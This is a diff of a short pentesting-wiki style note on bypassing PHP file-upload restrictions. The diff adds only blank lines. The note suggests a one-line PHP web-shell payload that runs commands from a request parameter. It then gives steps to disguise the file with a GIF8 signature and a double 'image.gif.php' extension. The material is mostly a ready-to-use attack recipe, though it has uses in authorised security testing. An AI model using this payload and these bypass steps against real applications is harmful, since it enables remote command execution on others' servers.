@@ -25,16 +25,30 @@ Many web applications include upload forms with the option to restrict the files
 
 Many web applications include upload forms with the option to restrict the files which can be uploaded. Using PHP's built-in functions, uploads can be restricted based on file type, file signature, and extension. In cases where one or more of these restrictions is not properly implemented, it may be possible to upload files which skirt the restrictions, but are still executable.
 
+
+
 # Instructions
 
 1. Select a payload. Suggested:
 
+
+
 **Code**: [[<?php system($_REQUEST['cmd']); ?>]]
+
+
+
+
+
+
 
 2. Prepend `GIF8` and a newline to the payload, changing the file signature.
 
+
+
 **Code**: [[GIF8
 <?php system($_REQUEST['cmd']); ?>]]
+
+
 
 3. Change the filename to  image.gif.php to attempt to use double extension to pass whitelist filters.
 
@@ -46,3 +60,5 @@ Many web applications include upload forms with the option to restrict the files
 
 - [[php]]
 - [[Web Applications]]
+
+
